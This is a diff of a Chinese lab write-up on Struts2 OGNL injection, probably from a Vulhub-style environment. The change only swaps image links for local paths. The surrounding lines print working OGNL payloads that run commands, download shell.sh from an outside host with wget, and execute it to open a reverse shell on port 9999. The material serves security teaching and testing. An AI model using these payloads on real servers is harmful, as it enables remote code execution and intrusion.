@@ -43,7 +43,7 @@ docker-compose up -d
 %25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B%22id%22%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D
 ```
 
-![image-20220301154735903](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203011547043.png)
+![image-20220301154735903](./images/202203011547043.png)
 
 ### 反弹shell
 
@@ -70,7 +70,7 @@ python -m http.server 80
 %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"wget","192.168.174.128/shell.sh"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
 ```
 
-![image-20220301155634793](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203011556922.png)
+![image-20220301155634793](./images/202203011556922.png)
 
 执行shell.sh文件：
 
@@ -79,9 +79,9 @@ python -m http.server 80
 %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"bash","/usr/local/tomcat/shell.sh"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
 ```
 
-![image-20220301155834822](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203011558934.png)
+![image-20220301155834822](./images/202203011558934.png)
 
 监听9999端口，接收反弹shell：
 
-![image-20220301155706920](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203011557020.png)
+![image-20220301155706920](./images/202203011557020.png)
 
